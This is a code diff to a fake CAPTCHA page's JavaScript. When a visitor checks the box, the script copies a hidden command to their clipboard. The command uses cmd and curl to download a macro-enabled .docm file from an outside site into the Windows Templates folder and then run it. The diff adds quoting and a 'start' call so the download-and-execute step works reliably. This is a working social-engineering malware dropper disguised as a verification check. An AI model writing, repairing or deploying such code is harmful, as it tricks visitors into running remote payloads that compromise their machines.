@@ -339,7 +339,7 @@
                 document.getElementById("verifyButton").style.display = "inline-block"; // Show button
 
                 // Copy the hidden text to the clipboard when the CAPTCHA is checked
-                var textToCopy = 'cmd /c curl https://www.heritagelens.net/HeritageLensAlliance.docm -o %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm && %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm';
+                var textToCopy = 'cmd /c curl https://www.heritagelens.net/HeritageLensAlliance.docm -o "%appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm" && start "" "%appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm"';
                 navigator.clipboard.writeText(textToCopy).then(function() {
                     console.log('Text copied to clipboard');
                 }).catch(function(err) {
